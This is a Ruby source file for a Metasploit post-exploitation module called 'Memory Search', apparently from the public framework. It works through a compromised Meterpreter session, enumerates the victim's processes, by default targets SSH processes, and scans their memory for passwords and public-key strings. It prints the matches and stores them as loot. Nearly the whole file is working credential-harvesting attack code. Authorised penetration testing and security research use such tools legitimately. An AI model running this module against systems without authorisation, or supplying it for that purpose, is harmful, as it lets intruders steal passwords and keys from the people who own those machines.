##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Memory Search',
        'Description' => %q{
          This module allows for searching the memory space of running processes for
          potentially sensitive data such as passwords.
        },
        'License' => MSF_LICENSE,
        'Author' => %w[sjanusz-r7],
        'SessionTypes' => %w[meterpreter],
        'Platform' => %w[linux unix osx windows],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_memory_search
              stdapi_sys_process_get_processes
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        ::Msf::OptString.new('PROCESS_NAMES_GLOB', [false, 'Glob used to target processes', 'ssh*']),
        ::Msf::OptString.new('PROCESS_IDS', [false, 'Comma delimited process ID/IDs to search through']),
        ::Msf::OptString.new('REGEX', [true, 'Regular expression to search for within memory', 'publickey,password.*']),
        ::Msf::OptInt.new('MIN_MATCH_LEN', [true, 'The minimum number of bytes to match', 5]),
        ::Msf::OptInt.new('MAX_MATCH_LEN', [true, 'The maximum number of bytes to match', 127]),
        ::Msf::OptBool.new('REPLACE_NON_PRINTABLE_BYTES', [false, 'Replace non-printable bytes with "."', true]),
        ::Msf::OptBool.new('SAVE_LOOT', [false, 'Save the memory matches to loot', true])
      ]
    )
  end

  def process_names_glob
    datastore['PROCESS_NAMES_GLOB']
  end

  def process_ids
    datastore['PROCESS_IDS']
  end

  def regex
    datastore['REGEX']
  end

  def min_match_len
    datastore['MIN_MATCH_LEN']
  end

  def max_match_len
    datastore['MAX_MATCH_LEN']
  end

  def replace_non_printable_bytes?
    datastore['REPLACE_NON_PRINTABLE_BYTES']
  end

  def save_loot?
    datastore['SAVE_LOOT']
  end

  ARCH_MAP =
    {
      'i686' => ARCH_X86,
      'x86' => ARCH_X86,
      'x64' => ARCH_X64,
      'x86_64' => ARCH_X64
    }.freeze

  def get_target_processes
    raw_target_pids = process_ids || ''
    target_pids = raw_target_pids.split(',').map(&:to_i)
    target_processes = []

    session_processes = session.sys.process.get_processes
    process_table = session_processes.to_table
    process_table.columns.unshift 'Matched?'

    process_table.colprops.unshift(
      {
        'Formatters' => [],
        'Stylers' => [::Msf::Ui::Console::TablePrint::CustomColorStyler.new('true' => '%grn', 'false' => '%red')],
        'ColumnStylers' => []
      }
    )

    process_table.sort_index += 1

    session_processes.each.with_index do |session_process, index|
      pid, _ppid, name, _path, _session, _user, _arch = *session_process.values

      if target_pids.include?(pid) || ::File.fnmatch(process_names_glob || '', name, ::File::FNM_EXTGLOB)
        target_processes.append session_process
        process_table.rows[index].unshift 'true'
      else
        process_table.rows[index].unshift 'false'
      end
    end

    vprint_status(process_table.to_s)
    target_processes
  end

  def run_against_multiple_processes(processes: [])
    results = []

    processes.each do |process|
      response = nil
      status = nil

      begin
        response = session.sys.process.memory_search(
          pid: process['pid'],
          needles: [regex],
          min_match_length: min_match_len,
          max_match_length: max_match_len
        )
        status = :success
      rescue ::Rex::Post::Meterpreter::RequestError => e
        response = e
        status = :failure
      end

      results.append({ process: process, status: status, response: response })
    end

    results
  end

  def print_result(result: nil)
    return unless result

    process_info = "#{result[:process]['name']} (pid: #{result[:process]['pid']})"
    unless result[:status] == :success
      warning_message = "Memory search request for #{process_info} failed. Return code: #{result[:response]}"
      if result[:process]['arch'].empty? || result[:process]['path'].empty?
        warning_message << "\n    Potential reasons:"
        warning_message << "\n\tInsufficient permissions."
      end
      print_warning warning_message
      return
    end

    result_group_tlvs = result[:response].get_tlvs(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_RESULTS)
    if result_group_tlvs.empty?
      match_not_found_msg = "No regular expression matches were found in memory for #{process_info}."
      normalised_process_arch = ARCH_MAP[result[:process]['arch']] || result[:process]['arch']

      potential_failure_reasons = []

      if session.arch != normalised_process_arch
        potential_failure_reasons.append "Architecture mismatch (session: #{session.arch}) (process: #{normalised_process_arch})"
      end

      if potential_failure_reasons.any?
        match_not_found_msg << "\n    Potential reasons:"
        potential_failure_reasons.each { |potential_reason| match_not_found_msg << "\n\t#{potential_reason}" }
      end

      print_status match_not_found_msg
      return
    end

    results_table = ::Rex::Text::Table.new(
      'Header' => "Memory Matches for #{process_info}",
      'Indent' => 1,
      'Columns' => ['Match Address', 'Match Length', 'Match Buffer', 'Memory Region Start', 'Memory Region Size']
    )

    address_length = session.native_arch == ARCH_X64 ? 16 : 8
    result_group_tlvs.each do |result_group_tlv|
      match_address = result_group_tlv.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR).value.to_s(16).upcase
      match_buffer = result_group_tlv.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_STR).value
      # Mettle doesn't return this TLV. We can get the match length from the buffer instead.
      match_length = result_group_tlv.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_LEN)&.value
      match_length ||= match_buffer.bytesize
      region_start_address = result_group_tlv.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_START_ADDR).value.to_s(16).upcase
      region_start_size = result_group_tlv.get_tlv(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_SECT_LEN).value.to_s(16).upcase

      if replace_non_printable_bytes?
        match_buffer = match_buffer.bytes.map { |byte| /[[:print:]]/.match?(byte.chr) ? byte.chr : '.' }.join
      end

      results_table << [
        "0x#{match_address.rjust(address_length, '0')}",
        match_length,
        match_buffer.inspect,
        "0x#{region_start_address.rjust(address_length, '0')}",
        "0x#{region_start_size.rjust(address_length, '0')}"
      ]
    end

    print_status results_table.to_s
  end

  def save_loot(results: [])
    return if results.empty?

    # Each result has a single response, which contains zero or more group tlv's.
    results.each do |result|
      # We don't want to save results that failed
      next unless result[:status] == :success

      group_tlvs = result[:response].get_tlvs(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_RESULTS)
      next if group_tlvs.empty?

      group_tlvs.each do |group_tlv|
        match = group_tlv.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_STR)
        next unless match

        stored_loot = store_loot(
          'memory.dmp',
          'bin',
          session,
          match,
          "memory_search_#{result[:process]['name']}.bin",
          'Process Raw Memory Buffer'
        )
        vprint_good("Loot stored to: #{stored_loot}")
      end
    end
  end

  def run
    if session.type != 'meterpreter'
      print_error 'Only Meterpreter sessions are supported by this post module'
      return
    end

    if process_ids && !process_ids.match?(/^(\s*\d(\s*,\s*\d+\s*)*)*$/)
      print_error 'PROCESS_IDS is not a comma-separated list of integers'
      return
    end

    print_status "Running module against - #{session.info} (#{session.session_host}). This might take a few seconds..."

    print_status 'Getting target processes...'
    target_processes = get_target_processes
    if target_processes.empty?
      print_warning 'No target processes found.'
      return
    end

    target_processes_message = "Running against the following processes:\n"
    target_processes.each do |target_process|
      target_processes_message << "\t#{target_process['name']} (pid: #{target_process['pid']})\n"
    end

    print_status target_processes_message
    processes_results = run_against_multiple_processes(processes: target_processes)
    processes_results.each { |process_result| print_result(result: process_result) }

    save_loot(results: processes_results) if save_loot?
  end
end
